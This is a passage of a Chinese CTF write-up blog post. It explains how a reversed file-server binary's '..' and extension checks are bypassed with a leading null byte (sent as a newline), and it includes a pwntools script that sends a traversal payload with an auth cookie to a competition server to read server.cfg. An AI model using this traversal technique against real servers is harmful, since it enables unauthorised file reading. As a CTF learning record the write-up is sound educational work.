+<p>最后打开的路径为filea，如果filea中存在<code>..</code>而file中不存在<code>..</code>不就可以绕过了吗？而<code>filea=file+1</code>, 所以这就存在一种情况，<br><code>file=\0../xxx</code> -&gt; <code>filea=../xxx</code><br>所以，<code>strlen(file) == 0</code>,从而bypass这段代码:<br><figure class="highlight lisp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">v9 = strlen<span class="list">(<span class="keyword">file</span>)</span><span class="comment">;</span></span><br><span class="line">for <span class="list">( <span class="keyword">k</span> = <span class="number">0</span><span class="comment">; k &lt; v9; ++k )</span></span><br><span class="line">&#123;</span><br><span class="line">	if <span class="list">( <span class="keyword">file</span>[k] == <span class="number">0</span>x2E <span class="keyword">&amp;&amp;</span> file[k + <span class="number">1</span>] == <span class="number">0</span>x2E )</span></span><br><span class="line">		sub_40133B<span class="list">(<span class="number">2</span>, <span class="number">4203054</span>LL, <span class="list">(<span class="keyword">__int64</span>)</span>file, a1)</span><span class="comment">; </span></span><br><span class="line">&#125;</span></span><br></pre></td></tr></table></figure></p>
+<p>接下来就想想如何bypass后缀名，<br><figure class="highlight stata"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> ( !off_603160[2 * <span class="keyword">l</span>] )</span><br><span class="line">	goto LABEL_49;</span><br><span class="line">v3 = (signed int)<span class="literal">strlen</span>(off_603160[2 * <span class="keyword">l</span>]);</span><br><span class="line">v4 = off_603160[2 * <span class="keyword">l</span>];</span><br><span class="line">v5 = <span class="literal">strlen</span>(<span class="keyword">file</span>);</span><br><span class="line"><span class="keyword">if</span> ( !strncmp(&amp;<span class="keyword">file</span>[v5 - v3], v4, v3) )</span><br><span class="line">	<span class="keyword">break</span>;</span><br></pre></td></tr></table></figure></p>
+<p>这串是后缀判断的代码，按照前面bypass<code>..</code>的情况，<code>v5=0</code>, <code>v3 == 2 || v3 == 3</code>, 所以进行比较的字符串为<code>file[-2] || file[-3]</code></p>
+<figure class="highlight fortran"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">file</span> = (<span class="built_in">char</span> *)&amp;unk_605244;</span><br></pre></td></tr></table></figure>
+<p>所以我们可以构造出一个payload:<code>getz\n../xxx</code> (PS: <code>\0</code>需要通过<code>\n</code>或者<code>\r</code>进行转换)<br>那么我们可以得到：<br><figure class="highlight applescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">file</span> = <span class="string">"\0../xxx"</span></span><br><span class="line"><span class="type">file</span>[<span class="number">1</span>:] = <span class="string">"../xxx"</span></span><br><span class="line"><span class="type">file</span>[-<span class="number">2</span>] = <span class="string">"tz"</span></span><br></pre></td></tr></table></figure></p>
+<p>完美绕过所以判断，可以进行任意文件读取，payload：<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"><span class="comment">#-*- coding:utf-8 -*-</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">context.log_level=<span class="string">'debug'</span></span><br><span class="line">r = remote(<span class="string">'123.59.56.23'</span>, <span class="number">43481</span>)</span><br><span class="line">payload = <span class="string">"GEtz\n../server.cfg\nHTTP/1.0 Cookie: auth=BAjSrP9/AABm7NKs/38AAFgE0qz/fwAAEsjSrP9/AAA"</span></span><br><span class="line">r.send(payload)</span><br><span class="line"><span class="keyword">while</span> <span class="keyword">True</span>:</span><br><span class="line">	r.recv()</span><br></pre></td></tr></table></figure></p>
+<p>flag就在<code>../server.cfg</code>文件中</p>
+<p>做完这题后发现自己的逆向能力还是太差了，以后多做写逆向题….</p>
+
+      
+    </div>
+    
+  </div>
+  
+    
+    <div class="copyright">
+        <p><span>本文标题:</span><a href="/2016/06/27/0x1D/">寻找来自星星的你第二期Writeup</a></p>
+        <p><span>文章作者:</span><a href="/" title="回到主页">Hcamael</a></p>
+        <p><span>发布时间:</span>2016-06-27, 20:11:37</p>
+        <p><span>最后更新:</span>2016-06-27, 14:35:38</p>
+        <p>
+            <span>原始链接:</span><a class="post-url" href="/2016/06/27/0x1D/" title="寻找来自星星的你第二期Writeup">http://0x48.pw/2016/06/27/0x1D/</a>
+            <span class="copy-path" data-clipboard-text="原文: http://0x48.pw/2016/06/27/0x1D/　　作者: Hcamael" title="点击复制文章链接"><i class="fa fa-clipboard"></i></span>
+            <script src="//qn.lazysheep.cc/js/clipboard.min.js"></script>
+            <script> var clipboard = new Clipboard('.copy-path'); </script>
+        </p>
+        <p>
+            <span>许可协议:</span><i class="fa fa-creative-commons"></i> <a rel="license" href="http://creativecommons.org/licenses/by-nc-sa/4.0/" title="CC BY-NC-SA 4.0 International" target = "_blank">"署名-非商用-相同方式共享 4.0"</a> 转载请保留原文链接及作者。
+        </p>
+    </div>
+
+
+
+    <nav id="article-nav">
+        
+        
+            <div id="article-nav-older" class="article-nav-title">
+                <a href="/2016/06/17/0x1C/">
+                    三个白帽之招聘又开始了，你怕了吗？-Writeup
+                </a>
+            </div>
+        
+    </nav>
+
+  
+</article>
+
+    <div id="toc" class="toc-article">
+    <strong class="toc-title">文章目录</strong>
+    
+</div>
+<style>
+    .left-col .switch-btn {
+        display: none;
+    }
+    .left-col .switch-area {
+        display: none;
+    }
+</style>
+
+<input type="button" id="tocButton" value="隐藏目录"  title="点击按钮隐藏或者显示文章目录">
+<script>
+    var valueHide = "隐藏目录";
+    var valueShow = "显示目录";
+
+    if ($(".left-col").is(":hidden")) {
+        $("#tocButton").attr("value", valueShow);
+    }
+
+    $("#tocButton").click(function() {
+        if ($("#toc").is(":hidden")) {
+            $("#tocButton").attr("value", valueHide);
+            $("#toc").slideDown(320);
+            $(".switch-btn, .switch-area").fadeOut(300);
+        }
+        else {
+            $("#tocButton").attr("value", valueShow);
+            $("#toc").slideUp(350);
+            $(".switch-btn, .switch-area").fadeIn(500);
+        }
+    })
+
+    if ($(".toc").length < 1) {
+        $("#toc, #tocButton").hide();
+        $(".switch-btn, .switch-area").show();
+    }
+</script>
+
+
+
+
+    <div class="share">
+    <div class="bdsharebuttonbox">
+    <a href="#" class="bds_more" data-cmd="more"></a>
+    <a href="#" class="bds_tsina" data-cmd="tsina" title="分享到新浪微博"></a>
+    <a href="#" class="bds_sqq" data-cmd="sqq" title="分享给 QQ 好友"></a>
+    <a href="#" class="bds_copy" data-cmd="copy" title="复制网址"></a>
+    <a href="#" class="bds_mail" data-cmd="mail" title="通过邮件分享"></a>
+    <a href="#" class="bds_weixin" data-cmd="weixin" title="生成文章二维码"></a>
+    </div>
+    <script>
+        window._bd_share_config={
+            "common":{"bdSnsKey":{},"bdText":"","bdMini":"2","bdMiniList":false,"bdPic":"","bdStyle":"0","bdSize":"24"},"share":{}};with(document)0[(getElementsByTagName('head')[0]||body).appendChild(createElement('script')).src='http://bdimg.share.baidu.com/static/api/js/share.js?v=89860593.js?cdnversion='+~(-new Date()/36e5)];
+    </script>
+</div>
+
+
+
+    
+      <div class="duoshuo" id="comments">
+    <!-- 多说评论框 start -->
+    <div class="ds-thread" data-thread-key="2016/06/27/0x1D/" data-title="寻找来自星星的你第二期Writeup" data-url="http://0x48.pw/2016/06/27/0x1D/"></div>
+    <!-- 多说评论框 end -->
+    <!-- 多说公共JS代码 start (一个网页只需插入一次) -->
+    <script type="text/javascript">
+    var duoshuoQuery = {short_name:"hcamael"};
+    (function() {
+        var ds = document.createElement('script');
+        ds.type = 'text/javascript';ds.async = true;
+        ds.src = (document.location.protocol == 'https:' ? 'https:' : 'http:') + '//static.duoshuo.com/embed.js';
+        ds.charset = 'UTF-8';
+        (document.getElementsByTagName('head')[0] 
+         || document.getElementsByTagName('body')[0]).appendChild(ds);
+    })();
+    </script>
+    <!-- 多说公共JS代码 end -->
+</div>
+
+    
+
+
+
+
+    <div class="scroll" id="post-nav-button">
+        
+            <a href="/" title="回到主页"><i class="fa fa-home"></i></a>
+        
+
+        <a title="文章列表"><i class="fa fa-bars"></i><i class="fa fa-times"></i></a>
+
+        
+            <a href="/2016/06/17/0x1C/" title="下一篇: 三个白帽之招聘又开始了，你怕了吗？-Writeup">
+                <i class="fa fa-angle-right"></i>
+            </a>
+        
+    </div>
+
+    <ul class="post-list"><li class="post-list-item"><a class="post-list-link" href="/2016/06/27/0x1D/">寻找来自星星的你第二期Writeup</a></li><li class="post-list-item"><a class="post-list-link" href="/2016/06/17/0x1C/">三个白帽之招聘又开始了，你怕了吗？-Writeup</a></li><li class="post-list-item"><a class="post-list-link" href="/2016/05/10/0x1B/">SCTF Code Writeup</a></li><li class="post-list-item"><a class="post-list-link" href="/2016/05/03/0x1A/">GGCTF的对称密码学</a></li><li class="post-list-item"><a class="post-list-link" href="/2016/04/17/0x19/">How old are Crypto?</a></li><li class="post-list-item"><a class="post-list-link" href="/2016/04/08/0x18/">MySQLi-Error Injection</a></li><li class="post-list-item"><a class="post-list-link" href="/2016/04/04/0x17/">Python 使用dpkt分析数据包</a></li><li class="post-list-item"><a class="post-list-link" href="/2016/04/01/0x16/">CRYPTO技能修正</a></li><li class="post-list-item"><a class="post-list-link" href="/2016/03/21/0x15/">Pentester Lab Writeup</a></li><li class="post-list-item"><a class="post-list-link" href="/2016/03/17/0x14/">0CTF RSA?总结 || RSA学习笔记</a></li><li class="post-list-item"><a class="post-list-link" href="/2016/03/15/0x13/">This is AliCTF?</a></li><li class="post-list-item"><a class="post-list-link" href="/2016/03/14/0x12/">0CTF总结</a></li><li class="post-list-item"><a class="post-list-link" href="/2016/03/07/0x11/">unholy Writeup</a></li><li class="post-list-item"><a class="post-list-link" href="/2016/02/14/0x0F/">Nebula Writeup</a></li><li class="post-list-item"><a class="post-list-link" href="/2015/12/19/0x0E/">12.19网络方向培训</a></li><li class="post-list-item"><a class="post-list-link" href="/2015/12/08/0x0D/">HCTF之Black-Eat-Black总结</a></li><li class="post-list-item"><a class="post-list-link" href="/2015/12/01/0x0C/">Python 的 BaseHTTPServer模块分析小结</a></li><li class="post-list-item"><a class="post-list-link" href="/2015/10/31/0x0B/">10.31新生培训</a></li><li class="post-list-item"><a class="post-list-link" href="/2015/10/05/0x09/">不使用select情况下的各种盲注</a></li><li class="post-list-item"><a class="post-list-link" href="/2015/10/03/0x08/">2015XDCTF低分web题writeup</a></li><li class="post-list-item"><a class="post-list-link" href="/2015/08/07/0x06/">WeChall Writeup</a></li><li class="post-list-item"><a class="post-list-link" href="/2015/07/22/0x04/">git小记</a></li><li class="post-list-item"><a class="post-list-link" href="/2015/07/19/0x02/">对于硬盘事件的随想</a></li><li class="post-list-item"><a class="post-list-link" href="/2015/07/19/0x01/">对于这次硬盘坏掉事件小记</a></li><li class="post-list-item"><a class="post-list-link" href="/2015/07/19/0x00/">跳转到以前的博文</a></li></ul>
+
+
+
+
+    <script>
+        
+    </script>
+</div>
+      <footer id="footer">
+    <div class="outer">
+        <div id="footer-info">
+            <div class="footer-left">
+                &copy; 2016 Hcamael
+            </div>
+            <div class="footer-right">
+                <a href="http://hexo.io/" target="_blank" title="快速、简洁且高效的博客框架">Hexo</a>  Theme <a href="https://github.com/MOxFIVE/hexo-theme-yelee" target="_blank" title="简而不减 Hexo 双栏博客主题">Yelee</a> by MOxFIVE
+            </div>
+        </div>
+        
+            <div class="visit">
+                
+                    <span id="busuanzi_container_site_pv" style='display:none'>
+                        <span id="site-visit" >本站到访数: 
+                            <span id="busuanzi_value_site_uv"></span>
+                        </span>
+                    </span>
+                
+                
+                    <span>, </span>
+                
+                
+                    <span id="busuanzi_container_page_pv" style='display:none'>
+                        <span id="page-visit">本页阅读量: 
+                            <span id="busuanzi_value_page_pv"></span>
+                        </span>
+                    </span>
+                
+            </div>
+        
+    </div>
+</footer>
+    </div>
+    
+<script data-main="/js/main.js" src="//cdn.bootcss.com/require.js/2.1.22/require.min.js"></script>
+
+    <script>
+        $(document).ready(function() {
+            var iPad = window.navigator.userAgent.indexOf('iPad');
+            if (iPad > -1 || $(".left-col").css("display") === "none") {
+                var bgColorList = ["#9db3f4", "#414141", "#e5a859", "#f5dfc6", "#c084a0", "#847e72", "#cd8390", "#996731"];
+                var bgColor = Math.ceil(Math.random() * (bgColorList.length - 1));
+                $("body").css({"background-color": bgColorList[bgColor], "background-size": "cover"});
+            }
+            else {
+                var backgroundnum = 5;
+                var backgroundimg = "url(http://7xscw6.com1.z0.glb.clouddn.com/bg-bg-xx.jpg)".replace(/xx/gi, Math.ceil(Math.random() * backgroundnum));
+                $("body").css({"background": backgroundimg, "background-attachment": "fixed", "background-size": "cover"});
+            }
+        })
+    </script>
+
+
+
+
+<div class="scroll" id="scroll">
+    <a href="#" title="返回顶部"><i class="fa fa-arrow-up"></i></a>
+    <a href="#comments" title="查看评论"><i class="fa fa-comments-o"></i></a>
+    <a href="#footer" title="转到底部"><i class="fa fa-arrow-down"></i></a>
+</div>
+
+    <script src="//cdn.bootcss.com/jqueryui/1.10.4/jquery-ui.min.js"></script>
+
+<script async src="https://dn-lbstatics.qbox.me/busuanzi/2.3/busuanzi.pure.mini.js">
+</script>
+  </div>
+</body>
+</html>
